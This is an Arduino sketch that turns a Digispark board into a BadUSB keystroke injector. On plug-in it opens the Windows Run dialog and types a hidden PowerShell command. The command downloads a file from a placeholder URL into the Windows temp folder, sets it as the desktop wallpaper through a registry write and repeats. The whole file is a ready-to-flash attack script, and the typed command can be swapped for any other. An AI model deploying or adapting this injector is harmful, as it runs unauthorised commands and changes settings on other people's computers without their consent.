// Author : thewhiteh4t //
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.print("cmd /C ""start /MIN powershell iwr -Uri URL -OutFile C:/windows/temp/b.jpg;sp 'HKCU:Control Panel/Desktop' WallPaper 'C:/windows/temp/b.jpg';RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 5""");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
